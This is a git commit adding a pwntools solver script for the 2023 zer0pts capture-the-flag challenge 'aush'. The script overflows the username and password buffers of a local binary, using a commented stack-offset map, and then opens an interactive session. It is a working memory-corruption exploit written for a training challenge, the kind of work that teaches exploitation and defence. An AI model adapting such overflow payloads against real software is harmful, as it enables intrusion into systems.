e840a51c6514819a908b7d71c39b75a617a55605
ryhtbsh <ryhtbsh@gmail.com>
2024-04-02 15:06:19 +0900

    add 2023 zer0pts aush solver

---
+++ 2023/zer0pts/aush/solve.py
@@ -0,0 +1,25 @@
+from pwn import *
+
+p = process("./aush")
+
+'''
+RBP-0xa0    args
+RBP-0x80    username
+RBP-0x70    inpuser
+RBP-0x50    password
+RBP-0x30    inppass
+RBP
+RBP+0x128   evnp[0]
+'''
+
+payload  = b'a'*0x198
+payload += p64(0xdeadbeef)
+p.recvuntil(b'Username: ')
+p.send(payload)
+
+payload  = b'a'*0x158
+payload += p64(0)
+p.recvuntil(b'Password: ')
+p.send(payload)
+
+p.interactive()
